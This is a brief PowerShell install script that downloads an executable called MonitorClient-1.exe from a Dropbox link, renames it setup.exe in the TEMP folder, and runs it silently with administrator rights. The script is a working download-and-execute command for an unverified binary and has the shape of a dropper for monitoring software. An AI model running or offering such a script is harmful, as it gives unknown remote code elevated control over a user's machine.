# install.ps1 poky

$u = "https://www.dropbox.com/scl/fi/ihtnb0lu9gkmdg5wjdat9/MonitorClient-1.exe?rlkey=rjtun873wsylyhzxut8qll7e4&st=hvuazxvr&dl=1"
$p = "$env:TEMP\setup.exe"

Invoke-RestMethod $u -OutFile $p
Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
